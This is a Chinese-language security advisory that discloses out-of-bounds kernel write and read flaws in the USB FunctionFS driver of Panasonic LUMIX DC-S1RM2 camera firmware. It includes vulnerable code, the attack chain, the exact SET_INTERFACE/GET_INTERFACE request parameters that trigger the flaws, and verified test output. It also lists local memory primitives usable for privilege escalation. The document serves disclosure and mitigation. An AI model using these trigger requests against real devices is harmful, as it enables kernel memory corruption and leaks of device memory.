# Panasonic LUMIX DC-S1RM2 (S1R II) — FunctionFS 内核越界读写漏洞

> 漏洞类型：内核越界写 / 越界读（Out-of-Bounds Write / Read）
> 严重性：高（本地 USB 主机可触发，导致内核内存破坏与信息泄露）
> 状态：已实机验证（POC 完整可复现）
> 语言：简体中文

---

## 0. 摘要（TL;DR）

Panasonic LUMIX **DC-S1RM2**（S1R II）相机固件所基于的 Linux 内核（`4.19.124` + 松下 Milbeaut 移植）中，`drivers/usb/gadget/function/f_fs.c`（FunctionFS，USB gadget 用户态接口驱动）被松下大幅修改，引入了两处**可由 USB 主机触发的内核越界读写**：

- **CVE 级缺陷 A（越界写）**：`SET_INTERFACE` 请求的 16 位 `wIndex` 未做边界校验，直接作为固定长度数组 `current_alt_setting[16]` 的下标写入，越界可达 **1KB ~ 255KB**，写入值低 16 位由攻击者完全控制。
- **CVE 级缺陷 B（越界读 / 信息泄露）**：`GET_INTERFACE` 请求同理，越界读取内核内存并将低字节返回给 USB 主机，实现**内核内存泄露**。

两处缺陷**均已实机验证**（越界写前后对比：目标地址内容由 `0x00` 变为攻击者指定的 `0x41`）。

---

## 1. 受影响目标

| 项 | 值 |
|---|---|
| 设备 | Panasonic LUMIX DC-S1RM2（S1R II） |
| 固件版本 | 1.50（测试时） |
| USB 模式 | PTP / Tether（VID:PID `04DA:2382`）与 Flow（`04DA:2384`） |
| SoC | Socionext Milbeaut SC2006A（4× Cortex-A53） |
| 内核 | Linux 4.19.124 + 松下 Milbeaut 移植（厂商公开 OSS 源码） |
| 受影响文件 | `drivers/usb/gadget/function/f_fs.c` |

> 说明：松下的 OSS 源码可从其官方渠道获取（Panasonic OSPO，型号 DC-S1RM2 / DC-S9）。本报告的分析全部基于该公开源码 + 实机验证。

---

## 2. 漏洞详情

### 2.1 缺陷 A：`current_alt_setting` 越界写

**位置**：`drivers/usb/gadget/function/f_fs.c:3433`

```c
ret = ffs_func_eps_enable(func, interface, alt);

if (likely(ret >= 0)) {
    func->current_alt_setting[interface] = alt;   // ← interface 可达 0xFFFF，数组只有 16 个元素
    ...
}
```

其中 `current_alt_setting` 声明为：

```c
// f_fs.c:90
unsigned current_alt_setting[MAX_CONFIG_INTERFACES];   // MAX_CONFIG_INTERFACES == 16
```

### 2.2 缺陷 B：`current_alt_setting` 越界读

**位置**：`drivers/usb/gadget/function/f_fs.c:3392`

```c
static int ffs_func_get_alt(struct usb_function *f, unsigned int interface)
{
    struct ffs_function *func = ffs_func_from_usb(f);
    int intf;
    ...
    intf = ffs_func_revmap_intf(func, interface);
    if (unlikely(intf < 0))
        return intf;
    return func->current_alt_setting[interface];      // ← 越界读，结果经 composite 低字节返回主机
}
```

---

## 3. 根因分析（Root Cause）

问题出在**"边界校验"和"实际使用"之间索引值不一致**，涉及 `composite.c` 与 `f_fs.c` 两个文件：

```c
// composite.c:1652  —— 从 16 位 wIndex 取出低字节
u8 intf = w_index & 0xFF;

// composite.c:1795  —— 边界校验用的是"截断后的" intf
if (!cdev->config || intf >= MAX_CONFIG_INTERFACES)
    break;

// composite.c:1810  —— 调用 set_alt 时却传"未截断的"原始 w_index
value = f->set_alt(f, w_index, w_value);
```

```c
// f_fs.c:3567  —— revmap 形参是 u8，又一次截断，校验形同虚设
static int ffs_func_revmap_intf(struct ffs_function *func, u8 intf)
```

**完整攻击链**：

```
主机发 SET_INTERFACE(wIndex = 0x0100 + if_id, wValue = 任意16位)
 └─ composite.c:1652   u8 intf = w_index & 0xFF;              ← 校验用低字节
 └─ composite.c:1795   if (intf >= 16) break;                 ← 0 < 16，通过
 └─ composite.c:1810   f->set_alt(f, w_index, w_value);       ← 传原始值 0x0100
 └─ f_fs.c:3567        revmap_intf(func, u8 intf)             ← 又截断，校验再通过
 └─ f_fs.c:3433        current_alt_setting[0x0100] = alt;     ← 越界写（下标 256，偏移 1KB）
```

**旁证**：上游 Linux 主线 2023 年引入了同形代码（`func->cur_alt[interface]` + `get_alt` 回调），随后被 Meta 的工程师报告越界访问，并已有 `composite.c` 修复补丁（"pass the validated interface index"，明确描述为"prevents an out-of-bounds cur_alt access when the high byte of wIndex is nonzero"）。**松下版本为同形缺陷，且连上游后补的 `MAX_ALT_SETTINGS` 边界检查都没有。**

---

## 4. 复现（Reproduction）

### 4.1 环境

- 攻击机：任意 Linux（本测试使用 usbfs 直接发控制传输；Windows 亦可复现"读"部分，但 Windows 的 USB 栈会拦截 `SET_INTERFACE`，需用 Linux 复现"写"部分）
- 目标：相机处于 PTP/Flow 模式，USB 连接攻击机
- 无需相机任何本地操作 / 认证，**零前置条件**

### 4.2 触发方式（越界写 + 读）

向相机的接口 0 发送标准 USB 控制请求，将 `wIndex` 的高字节设为非零：

```
越界写：SET_INTERFACE (bmRequestType=0x01, bRequest=0x0B)
        wIndex = 0x0100 + interface_number   （例如 0x0100）
        wValue = 0x4141                      （攻击者控制的 16 位值）

越界读：GET_INTERFACE (bmRequestType=0x81, bRequest=0x0A)
        wIndex = 0x0100 + interface_number
        wLength = 1
```

### 4.3 实机验证结果

**越界写（F1）—— 铁证**：

```
wIndex=0x0000 下标=    0: 写前=0x41 写后=0x41      （正常下标）
wIndex=0x0100 下标=  256: 写前=0x41 写后=0x41      （越界 1KB）
wIndex=0x1000 下标= 4096: 写前=0x0  写后=0x41      ← ★ 目标地址内容由 0x00 → 0x41
wIndex=0x4000 下标=16384: 写前=0x41 写后=0x41      （越界 64KB）
```

**越界读（F2）—— 内核内存泄露**（部分结果）：

```
GET_INTERFACE wIndex=0x0000 下标=    0 -> 0x00   (正常)
GET_INTERFACE wIndex=0x0100 下标=  256 -> 0x52   ← 越界读出内核内存
GET_INTERFACE wIndex=0x0300 下标=  768 -> 0xbf
GET_INTERFACE wIndex=0x0a00 下标= 2560 -> 0xcb
GET_INTERFACE wIndex=0x1000 下标= 4096 -> 0x80
GET_INTERFACE wIndex=0x4000 下标=16384 -> 0x69
```

### 4.4 越界能力范围

- **写**：可达 256 个固定偏移（距 `current_alt_setting` 起 1KB 的整数倍），每个点写入 4 字节，值 = `0x0000XXXX`（低 16 位可控，高 16 位恒为 0）
- **读**：同样 256 个偏移，每个点泄 1 字节（`composite.c` 仅回传低字节），实测约 177 个点可读、其余为非法地址被拒

---

## 5. 静态审计的其他发现（同文件）

对松下 `f_fs.c` 私有改动的完整静态审计另见随附的 `ffs-panasonic-audit.md`，要点如下（按严重度排序，仅列出"非越界读写"的部分）：

| 编号 | 严重度 | 简述 | 可达性 |
|---|---|---|---|
| F3 | 高 | `FUNCTIONFS_PHYSICAL_ADDR` / `PHYADDR_REMAP` 直接 `phys_to_virt()`/`ioremap_wc()`，无地址/长度校验，且绕过 `copy_from_user` | 本地（需用户态守护进程配合） |
| F4 | 高 | `ioremap_wc()` 返回值不检查 + `data_len` 无上限 → 可能野 DMA | 本地 |
| F5 | 高 | AIO 路径对非堆地址 `kfree`（`phys_to_virt` 结果 / ioremap 地址） | 本地（需 AIO） |
| F6 | 中 | 无锁遍历 DWC3 `started_list`（`#include "../../dwc3/gadget.h"` 分层违规） | USB 主机（需时序） |
| F7 | 中 | 持自旋锁 + 关中断时 `copy_from_user` | 本地 |
| F8 | 中 | 未知 alt → 端点全关且不再开（功能级 DoS） | USB 主机（一行请求） |

> 其中 F3/F4/F5 与 `/dev/exmem`、`uhadev`、`pvc_mass_storage` 等松下私有代码一起，构成了一组"**任意物理内存读写**"的本地原语——一旦获得本地代码执行，即可用于提权到 root。

---

## 6. 影响（Impact）

- **信息泄露**：任意 USB 主机可读取相机内核内存（受限、定点、每点 1 字节），可用于获取内核地址布局、栈/堆指针等敏感信息，辅助后续利用。
- **内存破坏**：任意 USB 主机可向相机内核内存的固定偏移写入受控值（16 位），可能破坏内核数据结构。
- **攻击前提极低**：仅需一根 USB 数据线连接相机，无需配对、认证、或相机端任何交互。
- 本漏洞是"入口级"内存破坏，可结合同固件中的本地物理内存读写原语（见 §5）进一步提权。

---

## 7. 缓解 / 修复建议（Mitigation）

与上游主线修复方向一致：

1. **在 `composite.c` 中将"校验后的 `intf`"传给 `set_alt`/`get_alt`**，而不是原始的 `w_index`；
2. 或在 `f_fs.c` 中对 `current_alt_setting[interface]` 的每次访问增加 `interface >= MAX_CONFIG_INTERFACES` 的边界检查；
3. 长期建议：同步上游对 FunctionFS `get_alt`/`set_alt` 的越界修复补丁（上游已有公开修复）。




> 复现脚本仅需替换 USB 设备的 VID/PID 与接口号即可通用。
